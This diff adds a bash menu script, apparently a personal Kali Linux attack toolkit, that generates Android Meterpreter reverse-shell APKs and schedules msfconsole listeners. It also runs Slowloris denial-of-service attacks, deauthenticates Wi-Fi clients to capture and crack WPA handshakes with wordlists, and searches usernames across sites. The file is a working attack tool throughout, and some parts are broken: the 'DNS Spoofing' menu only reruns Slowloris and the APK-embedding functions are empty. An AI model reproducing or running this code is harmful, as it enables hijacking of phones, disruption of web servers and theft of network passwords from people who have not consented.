@@ -1,0 +1,568 @@
+#!/bin/bash
+# Script made by Aaron Vigal. http://www.aaronvigal.com
+
+function metasploitMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "M E T A S P L O I T - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Create Metasploit APK"
+    tput cup 5 3
+    echo "2. Embed into existing APK"
+    tput cup 6 3
+    echo "3. Exploit Attack"
+    tput cup 7 3
+    echo "4. Go Back"
+    tput bold
+    tput cup 11 3
+    read -p "Enter your choice [1-4] " choice
+    tput sgr0
+
+    if [ "$choice" == "1" ];then
+        createMenu
+    elif [ "$choice" == "2" ];then
+        embedMenu
+    elif [ "$choice" == "3" ];then
+        exploitMenu
+    elif [ "$choice" == "4" ];then
+	mainMenu
+    else
+	metasploitMenu
+    fi
+}
+function social_engineeringMenu (){
+	tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "S O C I A L  E N G I N E E R I N G - M E N U"
+    tput sgr0
+	tput cup 4 3
+	#Menu options
+	options[0]="Verbose Mode"
+	options[1]="Add Images To HTML Output"
+	options[2]="Check Against Every TLD"
+	options[3]="Open Links"
+	options[4]="Search Multiple Usernames"
+	options[5]="Search Douglas County Assessor"
+
+	variables = ""
+
+	#Actions to take based on selection
+	function ACTIONS {
+	    if [[ ${choices[0]} ]]; then
+		variables+=" -v"
+	    fi
+	    if [[ ${choices[1]} ]]; then
+		variables+=" -i"
+	    fi
+	    if [[ ${choices[2]} ]]; then
+		variables+=" -f"
+	    fi
+	    if [[ ${choices[3]} ]]; then
+		variables+=" -l"
+	    fi
+	    if [[ ${choices[4]} ]]; then
+		variables+=" -m"
+	    fi
+	    if [[ ${choices[5]} ]]; then
+		variables+=" -d"
+	    fi
+	}
+
+	#Variables
+	ERROR=" "
+
+	#Menu function
+	function MENU {
+	tput clear
+    	tput cup 0 0
+    	tput setaf 3
+    	echo "Aarons Kali Linux Toolkit."
+    	tput sgr0
+    	tput cup 2 3
+    	tput rev
+    	echo "S O C I A L  E N G I N E E R I N G - M E N U"
+    	tput sgr0
+	tput cup 4 3
+	    echo "[""${choices[0]:- }""]" $(( 1 ))". ${options[0]}"
+	tput cup 5 3
+	    echo "[""${choices[1]:- }""]" $(( 2 ))". ${options[1]}"
+	tput cup 6 3
+	    echo "[""${choices[2]:- }""]" $(( 3 ))". ${options[2]}"
+	tput cup 7 3
+	    echo "[""${choices[3]:- }""]" $(( 4 ))". ${options[3]}"
+	tput cup 8 3
+	    echo "[""${choices[4]:- }""]" $(( 5 ))". ${options[4]}"
+	tput cup 9 3
+	    echo "[""${choices[5]:- }""]" $(( 6 ))". ${options[5]}"
+	tput cup 11 3
+	    echo "$ERROR"
+	}
+
+	#Menu loop
+	while MENU && tput cup 11 3 && read -e -p "Enter your choices [1-6] then press ENTER: " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
+	    clear
+	    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]];then
+		(( SELECTION-- ))
+		if [[ "${choices[SELECTION]}" == "+" ]]; then
+		    choices[SELECTION]=""
+		else
+		    choices[SELECTION]="+"
+		fi
+		    ERROR=" "
+	    else
+		ERROR="Invalid option: $SELECTION"
+	    fi
+	done
+	ACTIONS
+	tput cup 13 3
+	read -p "What is the username to search? " username
+	python3 /usr/share/aaronstoolkit/social_engineering.py $variables -u $username
+}
+function createMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "C R E A T I O N - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Port forwarded"
+    tput cup 5 3
+    echo "2. Local network"
+    tput cup 6 3
+    echo "3. Go Back"
+    tput bold
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    tput sgr0
+    if [ "$choice" == "1" ];then
+        forwarded
+    elif [ "$choice" == "2" ];then
+        locall
+    elif [ "$choice" == "3" ];then
+        metasploitMenu
+    else
+	createMenu
+    fi
+}
+
+function forwarded (){
+    tput cup 11 3
+    read -p "Name your APK file: " name
+    tput cup 13 3
+    read -p "What is the internal IP Address? " internalip;
+    port="443";
+    externalip="$(curl -sS ifconfig.me/ip)"
+    msfvenom -p android/meterpreter/reverse_tcp --platform Android --arch dalvik LHOST=$externalip LPORT=$port R > ~/Desktop/$name.apk > /dev/null 2>&1
+    sed -i '4s/.*/set lhost '$internalip'/' /usr/share/aaronstoolkit/android.rb
+    sed -i '5s/.*/set lport '$port'/' /usr/share/aaronstoolkit/android.rb
+    tput cup 14 3
+    read -rsp $'Completed! Press any key to continue...\n' -n1 key
+    metasploitMenu
+}
+
+function locall (){
+    tput cup 11 3
+    read -p "Name your APK file: " name
+    tput cup 13 3
+    read -p "What is the internal IP Address? " internalip;
+    port="443";
+    msfvenom -p android/meterpreter/reverse_tcp --platform Android --arch dalvik LHOST=$internalip LPORT=$port R > ~/Desktop/$name.apk
+    sed -i '4s/.*/set lhost '$internalip'/' /usr/share/aaronstoolkit/android.rb
+    tput cup 14 3
+    read -rsp $'Completed! Press any key to continue...\n' -n1 key
+    metasploitMenu
+}
+function embedMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "E M B E D D I N G- M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Google Play APK"
+    tput cup 5 3
+    echo "2. Custom APK"
+    tput cup 6 3
+    echo "3. Go Back"
+    tput bold
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    tput sgr0
+
+    if [ "$choice" == "1" ];then
+        playstore
+    elif [ "$choice" == "2" ];then
+        custom
+    elif [ "$choice" == "3" ];then
+        metasploitMenu
+    else
+	embedMenu
+    fi
+}
+
+function playstore (){
+    tput cup 11 3
+    read -p "What is the name of the app? " appName
+}
+
+function custom (){
+    tput cup 11 3
+    read -p "What is the full path to your apk? " original
+}
+
+function exitt (){
+    tput clear
+    tput sgr0
+    tput rc
+    notify-send "Thank you for using aaronstoolkit :)"
+}
+function exploitMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "E X P L O I T A T I O N - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Exploit Now"
+    tput cup 5 3
+    echo "2. Timed Exploit"
+    tput cup 6 3
+    echo "3. Go Back"
+    tput bold
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    tput sgr0
+    if [ "$choice" == "1" ];then
+        now
+    elif [ "$choice" == "2" ];then
+        later
+    elif [ "$choice" == "3" ];then
+        metasploitMenu
+    else
+	exploitMenu
+    fi
+}
+
+function now (){
+    tput cup 11 3
+    read -p "What is the IP Address to listen on? " internalip;
+    sed -i '4s/.*/set lhost '$internalip'/' /root/Desktop/Metasploit/Android/android.rb
+    msfconsole -r /usr/share/aaronstoolkit/android.rb
+}
+
+function later (){
+    tput cup 11 3
+    read -p "What is the IP Address to listen on? " internalip;
+    sed -i '4s/.*/set lhost '$internalip'/' /root/Desktop/Metasploit/Android/android.rb
+    tput cup 12 3
+    read -p "What time do you want this to run? " time
+    numTimes=( $time )
+    hour=${numTimes%:*}
+    min=${numTimes##*:}
+    crontab -l > mycron
+    echo "$min $hour * * * msfconsole -r /usr/share/aaronstoolkit/android.rb" >> mycron
+    crontab mycron
+    rm mycron
+    tput cup 13 3
+    read -rsp $'Your task is scheduled! Press any key to continue...\n' -n1 key
+    metasploitMenu
+    
+}
+function mainMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "M A I N - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Metasploit"
+    tput cup 5 3
+    echo "2. DNS Spoofing"
+    tput cup 6 3
+    echo "3. Wireless Attacks"
+    tput cup 7 3
+    echo "4. Slowloris"
+    tput cup 8 3
+    echo "5. Social Engineering"
+    tput cup 9 3
+    echo "6. Exit"
+    tput bold
+    tput cup 11 3
+    read -p "Enter your choice [1-6] " choice
+    tput sgr0
+    if [ "$choice" == "1" ];then
+        metasploitMenu
+    elif [ "$choice" == "2" ];then
+        dnsMenu
+    elif [ "$choice" == "3" ];then
+        wifiMenu
+    elif [ "$choice" == "4" ];then
+        lorisMenu
+    elif [ "$choice" == "5" ];then
+        social_engineeringMenu
+    elif [ "$choice" == "6" ];then
+        exit
+    else
+	mainMenu
+    fi
+}
+function lorisMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "S L O W L O R I S - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Use HTTPS"
+    tput cup 5 3
+    echo "2. Use HTTP"
+    tput cup 6 3
+    echo "3. Go Back"
+    tput bold
+    tput sgr0
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    if [ "$choice" == "1" ];then
+        input
+        perl /usr/share/aaronstoolkit/slowloris.pl -dns $ipadd -port 80 -timeout $tor -num $threads -tcpto 5 -https > /dev/null 2>&1&stopLoris
+    elif [ "$choice" == "2" ];then
+        input
+        perl /usr/share/aaronstoolkit/slowloris.pl -dns $ipadd -port 80 -timeout $tor -num $threads -tcpto 5 -httpready> /dev/null 2>&1&stopLoris
+    elif [ "$choice" == "3" ];then
+        mainMenu
+    else
+	lorisMenu
+    fi
+}
+function stopLoris (){
+    tput cup 15 3
+    read -p "Running... Press any key to stop "
+    kill $!
+    clear
+    mainMenu
+}
+function input (){
+    tput cup 11 3
+    read -p "What is the ip address? " ipadd
+    tput cup 12 3
+    read -p "How many threads would you like? " threads
+    tput cup 13 3
+    read -p "What is the timeout rate? " tor
+}
+function dnsMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "D N S - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Use HTTPS"
+    tput cup 5 3
+    echo "2. Use HTTP"
+    tput cup 6 3
+    echo "3. Go Back"
+    tput bold
+    tput sgr0
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    if [ "$choice" == "1" ];then
+        input
+        perl /usr/share/aaronstoolkit/slowloris.pl -dns $ipadd -port 80 -timeout $tor -num $threads -tcpto 5 -https > /dev/null 2>&1&stopLoris
+    elif [ "$choice" == "2" ];then
+        input
+        perl /usr/share/aaronstoolkit/slowloris.pl -dns $ipadd -port 80 -timeout $tor -num $threads -tcpto 5 -httpready> /dev/null 2>&1&stopLoris
+    elif [ "$choice" == "3" ];then
+        mainMenu
+    else
+	lorisMenu
+    fi
+}
+function wifiMenu (){
+    tput clear
+    tput cup 0 0
+    tput setaf 3
+    echo "Aarons Kali Linux Toolkit."
+    tput sgr0
+    tput cup 2 3
+    tput rev
+    echo "W I F I - M E N U"
+    tput sgr0
+    tput cup 4 3
+    echo "1. Use rockyou.txt"
+    tput cup 5 3
+    echo "2. Use dnsmap.txt"
+    tput cup 6 3
+    echo "2. Use custom wordlist"
+    tput cup 7 3
+    echo "3. Go Back"
+    tput bold
+    tput sgr0
+    tput cup 11 3
+    read -p "Enter your choice [1-3] " choice
+    if [ "$choice" == "1" ];then
+        normalWifi
+    elif [ "$choice" == "2" ];then
+        otherWifi
+    elif [ "$choice" == "2" ];then
+        customWifi
+    elif [ "$choice" == "3" ];then
+        mainMenu
+    else
+	wifiMenu
+    fi
+}
+
+function normalWifi (){
+    tput cup 11 3
+    read -p "What is the name of the network? " name
+    echo $name > /usr/share/aaronstoolkit/name.txt
+    tput cup 12 3
+    echo " [+] Killing off harmfull proccesses..."
+    airmon-ng start wlan0 > /usr/share/aaronstoolkit/PIDOutput.txt
+    python /usr/share/aaronstoolkit/FindPID.py
+    tput cup 13 3
+    echo " [+] Fetching available networks..."
+    /usr/share/aaronstoolkit/./loading15&airodump-ng wlan0mon -w /usr/share/aaronstoolkit/BSSIDOutput --write-interval 10 -o csv> /dev/null 2>&1& sleep 15; kill $!
+    mv /usr/share/aaronstoolkit/BSSIDOutput-01.csv /usr/share/aaronstoolkit/BSSIDOutput.txt
+    python /usr/share/aaronstoolkit/FindBSSID.py
+    bssid=$(</usr/share/aaronstoolkit/bssid.txt)
+    channel=$(</usr/share/aaronstoolkit/channel.txt)
+    tput cup 14 3
+    echo " [+] Finding user BSSID on $name...               "
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w /usr/share/aaronstoolkit/DEAUTHOutput --bssid $bssid wlan0mon --write-interval 5 -o csv > /dev/null 2>&1& sleep 10; kill $!
+    mv /usr/share/aaronstoolkit/DEAUTHOutput-01.csv /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    python /usr/share/aaronstoolkit/FindDeauth.py
+    deauth=$(</usr/share/aaronstoolkit/deauth.txt)
+    tput cup 15 3
+    echo " [+] Sending deauthentication packets to $deauth..."
+    aireplay-ng -0 3 -a $deauth wlan0mon > /dev/null 2>&1
+    tput cup 16 3
+    echo " [+] Waiting on $bssid for handshake..."
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w $name --bssid $bssid wlan0mon > /dev/null 2>&1& sleep 10; kill $!
+    tput cup 17 3
+    echo " [+] Disabling monitor mode on wlan0mon...         "
+    airmon-ng stop wlan0mon > /dev/null 2>&1
+    tput cup 18 3
+    echo " [+] Cracking WPA handshake..."
+    sleep 2
+    aircrack-ng -w /usr/share/wordlists/rockyou.txt $name-01.cap
+    rm /usr/share/aaronstoolkit/name.txt /usr/share/aaronstoolkit/PIDOutput.txt /usr/share/aaronstoolkit/pythonOutput.txt /usr/share/aaronstoolkit/BSSIDOutput.txt /usr/share/aaronstoolkit/channel.txt /usr/share/aaronstoolkit/deauth.txt /usr/share/aaronstoolkit/bssid.txt /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    rm /usr/share/aaronstoolkit/$name-*
+}
+function otherWifi (){
+    tput cup 11 3
+    read -p "What is the name of the network? " name
+    echo $name > /usr/share/aaronstoolkit/name.txt
+    tput cup 12 3
+    echo " [+] Killing off harmfull proccesses..."
+    airmon-ng start wlan0 > /usr/share/aaronstoolkit/PIDOutput.txt
+    python /usr/share/aaronstoolkit/FindPID.py
+    tput cup 13 3
+    echo " [+] Fetching available networks..."
+    /usr/share/aaronstoolkit/./loading15&airodump-ng wlan0mon -w /usr/share/aaronstoolkit/BSSIDOutput --write-interval 10 -o csv> /dev/null 2>&1& sleep 15; kill $!
+    mv /usr/share/aaronstoolkit/BSSIDOutput-01.csv /usr/share/aaronstoolkit/BSSIDOutput.txt
+    python /usr/share/aaronstoolkit/FindBSSID.py
+    bssid=$(</usr/share/aaronstoolkit/bssid.txt)
+    channel=$(</usr/share/aaronstoolkit/channel.txt)
+    tput cup 14 3
+    echo " [+] Finding user BSSID on $name...               "
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w /usr/share/aaronstoolkit/DEAUTHOutput --bssid $bssid wlan0mon --write-interval 5 -o csv > /dev/null 2>&1& sleep 10; kill $!
+    mv /usr/share/aaronstoolkit/DEAUTHOutput-01.csv /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    python /usr/share/aaronstoolkit/FindDeauth.py
+    deauth=$(</usr/share/aaronstoolkit/deauth.txt)
+    tput cup 15 3
+    echo " [+] Sending deauthentication packets to $deauth..."
+    aireplay-ng -0 3 -a $deauth wlan0mon > /dev/null 2>&1
+    tput cup 16 3
+    echo " [+] Waiting on $bssid for handshake..."
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w $name --bssid $bssid wlan0mon > /dev/null 2>&1& sleep 10; kill $!
+    tput cup 17 3
+    echo " [+] Disabling monitor mode on wlan0mon...         "
+    airmon-ng stop wlan0mon > /dev/null 2>&1
+    tput cup 18 3
+    echo " [+] Cracking WPA handshake..."
+    sleep 2
+    aircrack-ng -w /usr/share/wordlists/dnsmap.txt $name-01.cap
+    rm /usr/share/aaronstoolkit/name.txt /usr/share/aaronstoolkit/PIDOutput.txt /usr/share/aaronstoolkit/pythonOutput.txt /usr/share/aaronstoolkit/BSSIDOutput.txt /usr/share/aaronstoolkit/channel.txt /usr/share/aaronstoolkit/deauth.txt /usr/share/aaronstoolkit/bssid.txt /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    rm /usr/share/aaronstoolkit/$name-*
+}
+function customWifi (){
+    tput cup 11 3
+    read -p "What is the name of the network? " name
+    tput cup 12 3
+    read -p "What is the path to the wordlist? " url
+    echo $name > /usr/share/aaronstoolkit/name.txt
+    tput cup 13 3
+    echo " [+] Killing off harmfull proccesses..."
+    airmon-ng start wlan0 > /usr/share/aaronstoolkit/PIDOutput.txt
+    python /usr/share/aaronstoolkit/FindPID.py
+    tput cup 14 3
+    echo " [+] Fetching available networks..."
+    /usr/share/aaronstoolkit/./loading15&airodump-ng wlan0mon -w /usr/share/aaronstoolkit/BSSIDOutput --write-interval 10 -o csv> /dev/null 2>&1& sleep 15; kill $!
+    mv /usr/share/aaronstoolkit/BSSIDOutput-01.csv /usr/share/aaronstoolkit/BSSIDOutput.txt
+    python /usr/share/aaronstoolkit/FindBSSID.py
+    bssid=$(</usr/share/aaronstoolkit/bssid.txt)
+    channel=$(</usr/share/aaronstoolkit/channel.txt)
+    tput cup 15 3
+    echo " [+] Finding user BSSID on $name...               "
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w /usr/share/aaronstoolkit/DEAUTHOutput --bssid $bssid wlan0mon --write-interval 5 -o csv > /dev/null 2>&1& sleep 10; kill $!
+    mv /usr/share/aaronstoolkit/DEAUTHOutput-01.csv /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    python /usr/share/aaronstoolkit/FindDeauth.py
+    deauth=$(</usr/share/aaronstoolkit/deauth.txt)
+    tput cup 16 3
+    echo " [+] Sending deauthentication packets to $deauth..."
+    aireplay-ng -0 3 -a $deauth wlan0mon > /dev/null 2>&1
+    tput cup 17 3
+    echo " [+] Waiting on $bssid for handshake..."
+    /usr/share/aaronstoolkit/./loading10&airodump-ng -c $channel -w $name --bssid $bssid wlan0mon > /dev/null 2>&1& sleep 10; kill $!
+    tput cup 18 3
+    echo " [+] Disabling monitor mode on wlan0mon...         "
+    airmon-ng stop wlan0mon > /dev/null 2>&1
+    tput cup 19 3
+    echo " [+] Cracking WPA handshake..."
+    sleep 2
+    aircrack-ng -w $url $name-01.cap
+    rm /usr/share/aaronstoolkit/name.txt /usr/share/aaronstoolkit/PIDOutput.txt /usr/share/aaronstoolkit/pythonOutput.txt /usr/share/aaronstoolkit/BSSIDOutput.txt /usr/share/aaronstoolkit/channel.txt /usr/share/aaronstoolkit/deauth.txt /usr/share/aaronstoolkit/bssid.txt /usr/share/aaronstoolkit/DEAUTHOutput.txt
+    rm /usr/share/aaronstoolkit/$name-*
+}
+
+mainMenu
+
+
+
+
